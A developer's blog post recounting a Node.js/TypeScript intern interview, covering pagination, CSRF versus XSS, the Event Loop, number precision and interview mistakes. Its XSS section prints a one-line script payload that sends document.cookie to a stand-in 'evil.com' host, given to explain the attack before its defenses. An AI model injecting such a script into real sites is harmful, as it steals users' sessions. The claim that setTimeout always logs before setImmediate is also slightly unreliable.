---
title: "My Junior Intern Backend Node.js TypeScript Interview - What They Asked and How I Answered"
author: "Nguyễn Hữu Khải - khaizinam"
pubDatetime: 2026-03-09T09:05:00.000Z
slug: ke-chuyen-phong-van-junior-intern-backend-nodejs-typescript-ho-hoi-gi-minh-tra-loi-ra-sao
lang: en
translationKey: post-197
featured: true
draft: false
tags:
  - "SeriesPhongVan"
description: "Today I want to share an interview I will never forget - my very first Junior Intern Backend Node.js TypeScript interview. Not because I nailed it, but because I blanked out at least three times. If you are preparing for a similar role, this post will save you a good amount of painful self-reflection. I will walk through every question, break down the correct answers, and share perspectives that m"
---

### **My Junior Intern Backend Node.js TypeScript Interview - What They Asked and How I Answered**

A 100% honest recap of a Junior Intern Backend Node.js TypeScript interview - from pagination without query params, CSRF vs XSS, Event Loop to the integer overflow trap. Read this so you don't blank out like I did!

Today I want to share an interview I will never forget - my very first **Junior Intern Backend Node.js TypeScript** interview. Not because I nailed it, but because I blanked out at least three times. If you are preparing for a similar role, this post will save you a good amount of painful self-reflection. I will walk through every question, break down the correct answers, and share perspectives that most blog posts never mention.

### Table of Contents

1\. [The self-introduction trap](#1-the-self-introduction-trap)

2\. [Pagination without query URL - the trick question](#2-pagination-without-query-url-the-trick-question)

3\. [CSRF vs XSS - the two most confused concepts](#3-csrf-vs-xss-the-two-most-confused-concepts)

4\. [Node.js Event Loop - the heart of the runtime](#4-nodejs-event-loop-the-heart-of-the-runtime)

5\. [O(1) sum function and the large number trap](#5-o1-sum-function-and-the-large-number-trap)

6\. [Bonus questions they threw in](#6-bonus-questions-they-threw-in)

7\. [Mistakes that cost me the round](#7-mistakes-that-cost-me-the-round)

8\. [Quick FAQ](#quick-faq)

9\. [Wrap-up and next steps](#wrap-up-and-next-steps)

* * *

#### 1\. The Self-Introduction Trap

I thought this part would be the easiest. It was not.

The interviewer said: **"Tell me about yourself."** And I proceeded to read my CV out loud from top to bottom. They nodded politely, but I could see exactly what they were thinking: **"I just read that."**

What they actually want to hear is not which university you attended or what your GPA was. They want to know **how you think**, how you approach problems, and most importantly - whether you are a good fit for the team.

##### A framework that works for backend intern introductions

1.  **Hook:** Open with one specific project or the moment you had your "aha" with backend development - not your school name.
2.  **Stack:** Clearly state Node.js, TypeScript, and the database you have actually worked with (PostgreSQL, MongoDB, etc.).
3.  **Mindset:** What you are currently learning and what problem you are solving in your side project right now.
4.  **Intent:** Why you want to work at this specific company - never say "to gain experience" generically.

Prepare a 90-second story, not a CV summary. Talking about a hard bug you debugged in a side project will leave a stronger impression than a 3.8 GPA.

* * *

#### 2\. Pagination Without Query URL - The Trick Question

The interviewer showed the following code and asked: **"What does this do? And are there other ways to implement pagination besides this approach?"**

// Controller reading page and limit from query string
export const getUsers = async (req: Request, res: Response) => {
  const page  = parseInt(req.query.page  as string) || 1;
  const limit = parseInt(req.query.limit as string) || 10;
  const skip  = (page - 1) \* limit;

  const users = await User.find().skip(skip).limit(limit);
  res.json(users);
};

This is **Offset Pagination** - the most common approach, but far from the only one. I actually knew this, but blanked on the exact terminology under pressure.

##### Method 1: Cursor-Based Pagination (Keyset Pagination)

Instead of passing **page=2&limit=10**, you use a **cursor** - typically the ID or timestamp of the last item the client has seen. This is exactly how Twitter, Facebook, and Instagram power their infinite scroll feeds.

export const getUsersCursor = async (req: Request, res: Response) => {
  const cursor = req.query.cursor as string; // ID of the last seen item
  const limit  = 10;

  const query = cursor ? { \_id: { $gt: cursor } } : {};

  const users = await User.find(query).limit(limit + 1);
  const hasNext = users.length > limit;
  if (hasNext) users.pop();

  res.json({
    data: users,
    nextCursor: hasNext ? users\[users.length - 1\].\_id : null
  });
};

**Offset vs Cursor - a practical comparison:**

*   **Offset Pagination:** Page 2 shifts when new data is inserted into page 1. Slow on large tables because the database must scan every skipped row. Not suited for real-time feeds.
*   **Cursor Pagination:** No data jumping when new items are inserted. Consistent performance regardless of table size. Uses indexes efficiently.

##### Method 2: Request Body Pagination (POST)

Used for complex APIs that need multiple filter conditions. Instead of cramming dozens of query params into a URL, you POST a JSON object:

// POST /api/users/search
export const searchUsers = async (req: Request, res: Response) => {
  const { page, limit, filters } = req.body;
  // filters: { role: 'admin', status: 'active', createdAfter: '...' }
};

##### Method 3: GraphQL Pagination (Relay Spec)

If the team uses GraphQL, the **Relay Cursor Spec** is the de facto standard with **edges**, **nodes**, and **pageInfo**. Mentioning this is a strong bonus point. What the interviewer really wants to test is whether you understand **trade-offs** - answering "there are other approaches like cursor pagination and body payload" and immediately comparing them will score you much higher.

* * *

#### 3\. CSRF vs XSS - The Two Most Confused Concepts

##### XSS - The attacker injects code into the browser

**Cross-Site Scripting (XSS)** occurs when an attacker successfully injects **malicious JavaScript** into your web page, and that script executes inside the victim's browser.

Simple example: you have a comment form and a user submits the following script. If the server renders this to HTML without sanitization, the script runs in the browser of **every other user** who visits that page - cookies are stolen, sessions are hijacked.

<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>

**Three common XSS types:**

*   **Stored XSS:** Payload is saved in the database and executes every time the page loads.
*   **Reflected XSS:** Payload lives in a URL, victim must click a malicious link.
*   **DOM-based XSS:** Exploits unsafe client-side JavaScript that manipulates the DOM.

**XSS defenses:** Escape and sanitize all output (use a library like DOMPurify), implement a Content Security Policy (CSP), use HttpOnly cookies so scripts cannot read them.

##### CSRF - The attacker hijacks a valid session

**Cross-Site Request Forgery (CSRF)** is fundamentally different. The attacker does not need to steal your cookie - they **exploit** that cookie to send requests impersonating the victim.

Scenario: you are logged into your online bank. You open another tab and visit a malicious site that embeds an image tag pointing to a fund transfer endpoint. The browser **automatically sends your bank cookie** with that request. If the bank has no CSRF protection, the transfer goes through.

**CSRF defenses:** CSRF tokens (server generates a random token, client must send it with every state-changing request), SameSite Cookie attribute (**SameSite=Strict** or **Lax**), validate the Origin and Referer headers.

**The key distinction:** XSS means the attacker runs code **inside** the victim's browser to steal data. CSRF means the attacker tricks the victim's browser into sending a **real, legitimate-looking request** without their knowledge. Two completely different attack vectors, two different defense strategies.

A follow-up question often asked: **"Does an HttpOnly cookie protect against XSS?"** - Answer: **partially**. HttpOnly prevents JavaScript from reading the cookie, but it does not stop Stored XSS from performing other actions like manipulating the DOM, keylogging, or exfiltrating other data on the page.

* * *

#### 4\. Node.js Event Loop - The Heart of the Runtime

![Node.js Event Loop - The Heart of the Runtime](https://cdn.khaizinam.io.vn/blogs/2b46af9a-6e8f-4e5f-a88c-4aa0c25e4e95.webp)

Node.js Event Loop - The Heart of the Runtime

This is a classic question. My mistake was giving a textbook answer - **"The Event Loop lets Node.js handle async operations..."** - without painting the full picture.

Node.js runs **single-threaded**, but that does not mean slow or blocking. The secret lies in the Event Loop working together with **libuv** to delegate I/O work outside the main thread.

##### The 6 phases of the Event Loop

1.  **timers:** Executes callbacks scheduled by setTimeout() and setInterval() whose delay has elapsed.
2.  **pending callbacks:** Executes I/O callbacks deferred from the previous iteration (e.g. TCP errors).
3.  **idle, prepare:** Used internally by libuv - you rarely interact with this directly.
4.  **poll:** Retrieves new I/O events and runs their callbacks. This is the **most critical phase** - if the poll queue is empty and no timers are pending, the Event Loop **blocks here** waiting for I/O.
5.  **check:** Executes callbacks registered with setImmediate().
6.  **close callbacks:** Cleanup callbacks such as socket.on('close').

##### The Microtask Queue - the Event Loop's VIP lane

Before moving to the next phase, Node.js **fully drains the microtask queue**. Priority order:

*   **process.nextTick()** - highest priority, runs before even Promise callbacks.
*   **Promise callbacks** (.then, .catch, async/await resolution).

setTimeout(()    => console.log('setTimeout'),   0);
setImmediate(()  => console.log('setImmediate'));
Promise.resolve().then(() => console.log('Promise'));
process.nextTick(() => console.log('nextTick'));

// Actual output:
// nextTick      ← microtask (nextTick queue)
// Promise       ← microtask (promise queue)
// setTimeout    ← macrotask (timers phase)
// setImmediate  ← macrotask (check phase)

A bonus point in interviews: mention **Worker Threads** and the **Cluster module** when explaining how to scale CPU-bound tasks - because the Event Loop offers zero help with heavy computation, and that is when you need to escape the single thread.

* * *

#### 5\. O(1) Sum Function and the Large Number Trap

The interviewer showed this function and asked: **"What happens if you run this with a very large number, say n = 10^15?"**

function sumTo(n: number): number {
  return (n \* (n + 1)) / 2;
}

I answered: **"Still O(1), super fast."** The interviewer nodded, then asked: **"But is the result correct?"** And I froze.

##### The problem: Number.MAX\_SAFE\_INTEGER

JavaScript uses **IEEE 754 double-precision floating point** for the number type. This means integers are only represented exactly up to **Number.MAX\_SAFE\_INTEGER = 9\_007\_199\_254\_740\_991** (approximately 9 × 10^15).

When n = 10^9, the result n × (n+1) / 2 ≈ 5 × 10^17 - already beyond MAX\_SAFE\_INTEGER. The function still runs, but **the result is wrong** due to floating point precision loss. O(1) speed means nothing if the answer is incorrect.

##### The fix: use BigInt

function sumToBig(n: bigint): bigint {
  return (n \* (n + 1n)) / 2n;
}

console.log(sumToBig(10n \*\* 15n)); // 100% accurate

**BigInt** handles arbitrarily large integers, but comes with trade-offs: slower than regular numbers and not directly compatible with the number type - explicit conversion is required. For financial applications requiring high precision, consider libraries like [decimal.js or bignumber.js](#).

The ideal answer covers all three angles: explain **Number.MAX\_SAFE\_INTEGER**, mention IEEE 754, and propose BigInt or an appropriate library. All three together make a complete response.

* * *

#### 6\. Bonus Questions They Threw In

After the first five questions, the interviewer wanted to dig deeper. Here is what they asked and what I learned from each.

##### Promise vs async/await - what is the real difference?

The correct answer: **no fundamental difference** - async/await is syntactic sugar over Promises. The practical differences lie in error handling (try/catch vs .catch()), readability with complex nested async logic, and edge cases like running parallel tasks with Promise.all instead of sequential awaits that slow things down unnecessarily.

##### When should you use TypeScript generics?

They showed code littered with **any** and asked how to improve it. This is your chance to demonstrate real understanding of type safety. Generics are not for decoration - they let you write functions and classes that work correctly across multiple types **without losing type information**. Check out [this guide on TypeScript generics for Node.js backend](#) if you are still fuzzy on this.

##### How does Express middleware work?

They wanted to hear about the **middleware chain**, how next() passes control, error middleware with its four parameters (err, req, res, next), and how registration order affects behavior. Understanding the [Express request lifecycle](#) makes this question straightforward.

##### Database indexing - when to use it and when not to?

Indexes speed up SELECT but slow down INSERT, UPDATE, and DELETE because the database must update the index too. Not every column needs an index - only those that frequently appear in WHERE, JOIN, and ORDER BY clauses. Bringing up **composite indexes and selectivity** is a strong bonus point.

* * *

#### 7\. Mistakes That Cost Me the Round

##### Mistake 1: Memorizing without understanding

I could recite "the Event Loop has 6 phases" but could not explain why nextTick runs before a Promise callback. **Fix:** Always prepare a runnable code example to prove you genuinely understand, not just copied from the docs.

##### Mistake 2: Not asking for clarification

I sat in silence for 30 seconds simply because I was afraid to ask "do you mean HTTP methods or REST conventions?" **Fix:** Clarify immediately. Interviewers respect candidates who ask the right questions - it signals strong engineering thinking.

##### Mistake 3: No security mindset

When discussing APIs, I never mentioned authentication, rate limiting, or input validation. **Fix:** For every API or backend question, always volunteer at least one related security concern - even if they did not ask.

##### Mistake 4: Explaining with theory instead of examples

"CSRF is a cross-site request forgery attack..." sounds textbook. **Fix:** Tell a concrete scenario like the bank example above - interviewers remember it longer and judge your understanding as deeper.

##### Mistake 5: No questions for the interviewer

At the end they asked "Do you have any questions?" and I said "No, I'm good." That was a serious missed opportunity. **Fix:** Prepare three questions - about the team's current tech stack, the onboarding process, and the mentorship culture.

##### Mistake 6: Over-engineering answers

A simple pagination question somehow led me to talk about GraphQL Federation. **Fix:** Answer within the scope of the question first, then ask "Would you like me to go deeper on any part of this?"

##### Mistake 7: Unable to explain technical decisions in the CV

They asked "Why did you use MongoDB instead of PostgreSQL in this project?" and I had no better answer than "because the tutorial used MongoDB." **Fix:** For every tech choice on your CV, prepare a 2-3 sentence trade-off analysis before walking into any interview.

* * *

#### Quick FAQ

##### Hỏi: How deep does a Backend Node.js intern need to know TypeScript?

**Answer:** You do not need to memorize advanced types like infer or conditional types. But you must be solid on: interface vs type, basic generics, utility types (Partial, Pick, Omit), and most importantly understanding why you avoid any. That level is enough to handle the tough corners in an intern interview.

##### Hỏi: Do I need to know Docker for a backend intern interview?

**Answer:** Not required, but knowing the basics of Dockerfile and docker-compose is a significant bonus. Most teams deploy with containers today, and an intern who can set up their own local environment with Docker saves the whole team a lot of onboarding time.

##### Hỏi: Will there be live coding in an intern interview?

**Answer:** Depends on the company. Startups often use a 2-4 hour take-home test or a 30-45 minute live coding session. Larger companies may have an OA on HackerRank. In every case, practice writing clean code with comments that walk through your thinking process - not just code that runs correctly.

##### Hỏi: Should I learn REST API or GraphQL first?

**Answer:** REST first, no debate. Nearly 100% of interns will work with REST APIs from day one. GraphQL is nice-to-have, and once you understand REST deeply you will pick up GraphQL quickly because it was built to solve REST's specific problems.

##### Hỏi: Can I get an intern interview without a side project?

**Answer:** Not required on paper, but extremely important in practice. A side project is the only evidence you can present when you have no real work experience. If you do not have one yet, build a simple CRUD API with Node.js, TypeScript, and PostgreSQL over 2-3 weeks - enough to have a real conversation about actual problems you encountered and how you solved them.

* * *

#### Wrap-Up and Next Steps

Looking back at that interview, I did not fail because I lacked knowledge - I failed because I **knew things but could not articulate them**. That was the most expensive lesson I learned.

What actually matters for a junior backend intern:

*   Understand the **fundamentals** of your tools, not just the syntax - know the why, not just the how.
*   Have a **clear mental model** of async, I/O, and the request lifecycle in Node.js.
*   Always think in **trade-offs** rather than "the one right way" - there are no silver bullets in engineering.
*   Develop a **security mindset early** - CSRF, XSS, and SQL injection are the baseline for every backend developer.
*   Build a **real side project** so you have a story to tell and real bugs to learn from.

I know the feeling of waiting for a result email after realizing you blanked out several times. But regardless of the outcome, every interview is a free lesson from experienced engineers. Do not waste it.

Good luck walking into your next interview with confidence - not because you know everything, but because you know **how to think clearly when faced with what you do not yet know**.
